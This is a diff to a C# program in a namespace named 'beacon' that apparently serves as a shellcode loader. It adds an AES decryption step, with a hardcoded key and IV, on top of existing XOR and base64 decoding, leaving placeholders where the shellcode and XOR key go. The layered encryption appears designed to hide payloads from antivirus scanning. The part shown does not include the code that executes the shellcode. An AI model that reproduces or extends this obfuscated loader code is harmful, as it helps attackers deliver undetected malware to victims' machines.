@@ -2,6 +2,8 @@
 // C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
 
 using System;
+using System.IO;
+using System.Security.Cryptography;
 using System.Collections.Generic;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -165,19 +167,68 @@ namespace beacon
             return mixed;
         }
 
-         public static void Main()
+        public static string DecryptStringFromBytes(byte[] cipherText, byte[] Key, byte[] IV)
+        {
+            // Check arguments.
+            if (cipherText == null || cipherText.Length <= 0)
+                throw new ArgumentNullException("cipherText");
+            if (Key == null || Key.Length <= 0)
+                throw new ArgumentNullException("Key");
+            if (IV == null || IV.Length <= 0)
+                throw new ArgumentNullException("Key");
+
+            // Declare the string used to hold
+            // the decrypted text.
+            string plaintext = null;
+
+            // Create an RijndaelManaged object
+            // with the specified key and IV.
+            using (RijndaelManaged rijAlg = new RijndaelManaged())
+            {
+                rijAlg.Key = Key;
+                rijAlg.IV = IV;
+
+                // Create a decrytor to perform the stream transform.
+                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
+
+                // Create the streams used for decryption.
+                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
+                {
+                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
+                    {
+                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
+                        {
+
+                            // Read the decrypted bytes from the decrypting stream
+                            // and place them in a string.
+                            plaintext = srDecrypt.ReadToEnd();
+                        }
+                    }
+                }
+
+            }
+
+            return plaintext;
+
+        }
+
+        public static void Main()
         {
 
-            string xoredB64 = "REPLACE SHELLCODE HERE";
+            string xoredAesB64 = "REPLACE SHELLCODE HERE";
             string xorKey = "REPLACE XORKEY";
+            byte[] key = new byte[32] { 0x81, 0x8a, 0xba, 0x08, 0xe0, 0xf0, 0x29, 0x7b, 0xe6, 0x6d, 0xf4, 0xa5, 0x66, 0x37, 0xec, 0x0e, 0x31, 0x8e, 0xa8, 0xae, 0x0e, 0x06, 0xa8, 0xab, 0x53, 0xcf, 0xcf, 0x99, 0x4a, 0xca, 0xc8, 0xc8 };
+            byte[] iv = new byte[16] { 0x9d, 0xa8, 0xd3, 0xb1, 0xe2, 0xc9, 0x6b, 0xe9, 0x5d, 0x3a, 0x29, 0x04, 0xc1, 0x83, 0x57, 0x68 };
 
             byte[] sh3Llc0d3 = new byte[] { };
 
-            sh3Llc0d3 = xorEncDec((Convert.FromBase64String(xoredB64)), xorKey);
+            byte[] aesEncrypted = xorEncDec(Convert.FromBase64String(xoredAesB64), xorKey);
+
+            sh3Llc0d3 = Convert.FromBase64String(DecryptStringFromBytes(aesEncrypted, key, iv));
+
+            //var decrypted = DecryptStringFromBytes(xorEncDec(Convert.FromBase64String(xorAesEncStringB64), xorKey),key,iv);
 
             // Console.WriteLine($"XOR decrypted text: {shellcode}");
-
-            // Console.WriteLine("shellcode is loaded: "+ Convert.ToBase64String(shellcode));
 
             //shellcode = Convert.FromBase64String(b64);
 
